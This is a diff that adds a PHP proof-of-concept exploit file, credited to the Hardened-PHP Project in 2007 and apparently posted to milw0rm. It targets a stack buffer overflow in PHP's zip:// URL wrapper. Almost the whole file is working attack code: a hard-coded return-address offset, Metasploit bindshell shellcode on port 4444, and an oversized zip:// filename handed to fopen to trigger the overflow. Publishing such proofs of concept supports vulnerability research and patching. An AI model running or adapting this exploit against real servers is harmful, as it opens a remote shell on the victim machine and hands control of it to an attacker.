@@ -1,0 +1,47 @@
+<?php
+  ////////////////////////////////////////////////////////////////////////
+  //  _  _                _                     _       ___  _  _  ___  //
+  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
+  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
+  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
+  //                                                                    //
+  //         Proof of concept code from the Hardened-PHP Project        //
+  //                   (C) Copyright 2007 Stefan Esser                  //
+  //                                                                    //
+  ////////////////////////////////////////////////////////////////////////
+  //            PHP zip:// URL Wrapper Stack Buffer Overflow            //
+  ////////////////////////////////////////////////////////////////////////
+
+  // This is meant as a protection against remote file inclusion.
+  die("REMOVE THIS LINE");
+
+  // Offset of a POP EBP, RET inside the PHP binary
+  $offset = 0x080d7da3;
+
+  // linux x86 bindshell on port 4444 from Metasploit
+  $shellcode = "\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46".
+      "\x32\x3c\xe5\x83\xeb\xfc\xe2\xf4\x77\xe9\x6f\xa6\x15\x58\x3e\x8f".
+      "\x20\x6a\xa5\x6c\xa7\xff\xbc\x73\x05\x60\x5a\x8d\x57\x6e\x5a\xb6".
+      "\xcf\xd3\x56\x83\x1e\x62\x6d\xb3\xcf\xd3\xf1\x65\xf6\x54\xed\x06".
+      "\x8b\xb2\x6e\xb7\x10\x71\xb5\x04\xf6\x54\xf1\x65\xd5\x58\x3e\xbc".
+      "\xf6\x0d\xf1\x65\x0f\x4b\xc5\x55\x4d\x60\x54\xca\x69\x41\x54\x8d".
+      "\x69\x50\x55\x8b\xcf\xd1\x6e\xb6\xcf\xd3\xf1\x65";
+
+  // Align the shellcode on 4 bytes      
+  while (strlen($shellcode) % 4 != 0) $shellcode .= "X";
+
+  // Convert Offset into String and calculate size
+  $str = pack("L", $offset);
+  $len = 4096 + 32 - strlen($shellcode) - 400;
+  
+  // Construct the filename
+  $fname = "zip://A".str_repeat("A", 400)."$shellcode".str_repeat($str, $len / 4)."#EXPLOIT";
+
+
+  
+  // Trigger the EXPLOIT could also be a remote URL include
+  fopen($fname,"a+");
+
+?>
+
+# milw0rm.com [2007-03-09]
